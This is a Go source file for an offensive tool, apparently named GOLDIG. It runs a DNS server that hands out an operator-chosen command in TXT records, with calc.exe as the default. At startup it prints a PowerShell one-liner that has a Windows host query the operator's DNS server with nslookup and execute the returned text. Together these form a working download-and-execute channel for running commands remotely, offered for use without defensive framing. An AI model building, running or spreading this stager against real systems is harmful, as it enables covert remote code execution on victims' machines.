package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"net/netip"
	"os"

	"github.com/phuslu/fastdns"
)

func banner() {
	fmt.Println(`
 ██████╗  ██████╗ ██╗     ██████╗ ██╗ ██████╗ 
██╔════╝ ██╔═══██╗██║     ██╔══██╗██║██╔════╝ 
██║  ███╗██║   ██║██║     ██║  ██║██║██║  ███╗
██║   ██║██║   ██║██║     ██║  ██║██║██║   ██║
╚██████╔╝╚██████╔╝███████╗██████╔╝██║╚██████╔╝
 ╚═════╝  ╚═════╝ ╚══════╝╚═════╝ ╚═╝ ╚═════╝ `)
	fmt.Print("                   by https://gitlab.com/lu-ka\n\n")
}

func usage() {
	fmt.Print(`-i	Interface to bind to (default: eth0)
-p	Port to use (default: 53)
-c	Command to serve (default: calc.exe)
-d	Domain to answer to (default: example.com)
-h	Shows this text
`)
}

type DNSHandler struct {
	domain  string
	command string
}

func (handler *DNSHandler) ServeDNS(rw fastdns.ResponseWriter, req *fastdns.Message) {

	if fmt.Sprint(req.Question.Type) != "PTR" { // ignore PTR for console output
		log.Printf("Got %s request for %s", req.Question.Type, req.Domain)
	}
	// Answer only to the requested domain
	if string(req.Domain) == handler.domain {
		switch req.Question.Type {
		case fastdns.TypeA:
			fastdns.HOST(rw, req, 60, []netip.Addr{netip.MustParseAddr("127.0.0.1")})
		case fastdns.TypeTXT:
			fastdns.TXT(rw, req, 60, handler.command)
		default:
			fastdns.Error(rw, req, fastdns.RcodeNXDomain)
		}
	} else if fmt.Sprint(req.Question.Type) != "PTR" { // ignore PTR for console output
		log.Printf("Requested domain %s not known", string(req.Domain))
		fastdns.Error(rw, req, fastdns.RcodeNXDomain)
	} else {
		fastdns.Error(rw, req, fastdns.RcodeNXDomain)
	}
}

// https://stackoverflow.com/a/51829730
func GetIPFromInterface(intfname string) (string, error) {
	intf, _ := net.InterfaceByName(intfname) // get all interfaces with that name
	items, _ := intf.Addrs()

	var ip net.IP

	for _, addr := range items { // for all addresses on that interface
		switch v := addr.(type) {
		case *net.IPNet: // if address type is IP
			if !v.IP.IsLoopback() { // if address is not loopback
				if v.IP.To4() != nil { // if address is IPv4
					ip = v.IP
				}
			}
		}
	}

	if ip != nil { // if interface has ip
		return ip.String(), nil

	} else { // if interface does not have ip
		return "", fmt.Errorf("interface %s does not exist or does not have an IPv4 address assigned", intfname)
	}
}

func main() {

	// args
	var intfname string
	var lport int
	var command string
	var domain string
	var help bool

	flag.StringVar(&intfname, "i", "eth0", "Interface to bind to")
	flag.IntVar(&lport, "p", 53, "Port to use")
	flag.StringVar(&command, "c", "calc.exe", "Command to serve")
	flag.StringVar(&domain, "d", "example.com", "Domain to answer to")
	flag.BoolVar(&help, "h", false, "Shows help text")
	flag.Parse()

	if help {
		banner()
		usage()
		os.Exit(0)
	}

	banner()

	// get IP of interface
	lhost, err := GetIPFromInterface(intfname)
	if err != nil {
		log.Printf("%s\n", err)
		os.Exit(1)
	}

	addr := fmt.Sprintf("%s:%d", lhost, lport)
	log.Printf("Listening on %s\n", addr)

	// windows does sot support any other port than 53 with single line nslookup
	if lport != 53 {
		log.Printf("'nslookup' oneliners will not work on a different port than 53, you have been warned")
	} else {
		log.Printf("Command: powershell . (nslookup -q=txt %s %s)[-1]\n", domain, lhost)
	}

	// txt records can me a max of 255 chars
	if len(command) > 255 {
		log.Printf("Your payload is too big. TXT records can be a max of 255 chars")
		os.Exit(1)
	}

	server := &fastdns.Server{
		Handler: &DNSHandler{
			command: command,
			domain:  domain,
		},
		MaxProcs: 1,
	}

	// start server
	err = server.ListenAndServe(addr)
	if err != nil {
		log.Printf("%s\n", err)
	}

}
